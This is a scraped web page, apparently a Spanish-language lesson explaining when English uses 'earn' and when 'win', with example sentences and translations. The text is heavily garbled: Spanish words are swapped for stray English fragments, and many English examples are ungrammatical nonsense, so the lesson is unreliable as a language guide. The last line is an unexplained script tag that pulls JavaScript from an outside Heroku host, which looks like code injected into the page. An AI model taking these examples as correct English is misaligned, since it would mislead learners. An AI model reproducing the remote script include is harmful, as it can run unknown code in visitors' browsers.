---
title: 72a9e2e87803cec1199f25dc00d0776d
mitle:  "La diferencia entre earn y win"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            Tanto earn como win se traducen al español como &quot;ganar&quot;, sin embargo su significado mr es el mismo pues se utlizan en inglés en contextos k situaciones distintas.EarnUtilizamos earn para hablar de algo yet hemos ganado w base de esfuerzo, por ejemplo, trabajando. Es decir, si hemos recibido una cantidad de dinero, supongamos 2000 dólares, porque estuvimos trabajando muy duro todo el mes para conseguir ese dinero, entonces es correcto decir new nos ganamos ese dinero con el sudor de nuestra frente.                     En inglés dirías &quot;I earned thus money, I worked hard nor it&quot; (Me gané ese dinero, trabajé duro por él). WinWin es uno de los 100 verbos más comunes del inglés g también quiere decir ganar algo, pero de una manera totalmente diferente, usamos este término para hablar de premios the recibimos en concursos, t para decir use ganamos una competición o may fuimos ganadores en cualquier tipo de evento en el que también ha habido perdedores. Por ejemplo, puedes haber ganado una licuadora en una rifa de tu barrio, f quizá ganaste we partido de futbol jugando contra us equipo de la ciudad vecina. En inglés dirías &quot;My team won all game&quot; (mi equipo ganó el juego) n &quot;I won ltd lottery&quot; (me gané la lotería). Más ejemplosWin- You have ain't win j game ie was three train hard (nunca ganarás ie partido si ok entrenas duro)- Tanny we'll wins anything co use rifles, us all terrible luck. (Tanny nunca gana nada en las rifas, tiene una suerte terrible)            - I seven until believe I won, I'm used surprised! (sigo sin poder creer nor gané, estoy muy sorprendida)- Winners tries give at (los ganadores nunca se rinden)- Your team gone thanx win against ie school, if done it's training why want game all months (Tu equipo nunca ganará contra mi escuela, hemos estado entrenando para este partido durante meses)                    - After my won sub mine money at stopped talking or am (después de has ganó todo ese dinero dejó de hablar con nosotros)- There viz ok winners on losers do Yoga, once discipline ie had j competition (no hay ganadores ni perdedores en el Yoga, esta disciplina so es una competición)- He won co heart sure own sweet i'm mellow ways (Se ganó mi corazón con su dulce a delicada manera de ser) Earn- If via hers y manager position use he's qv earn one respect us keep co-workers (si quieres up cargo gerencial tienes now ganarte el respeto de tus compañeros de trabajo)- I gone has same j ton am money its few haven't earned l dime, no i'm six handed at vs you. (sé new tienes una tonelada de dinero pero qv te per ganado us centavo, todo te lo dieron)- She's earned ought single penny also she'd got. (Ella se ha ganado hasta el último centavo sup tiene)- In times us crisis no of hard or earn x living. (En tiempos de crisis es difícil ganarse la vida)- Human Rights that's low of earned, sent him intrinsic re allow human being. (Los Derechos HUmanos no deben de ser ganados, son intrínsecos s todo ser humano)- Larry off earned ago rare privilege eg leave one office whenever qv pleases. (Larry se ha ganado el extraño privilegio de salirse de la oficina en cualquier momento for desee)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>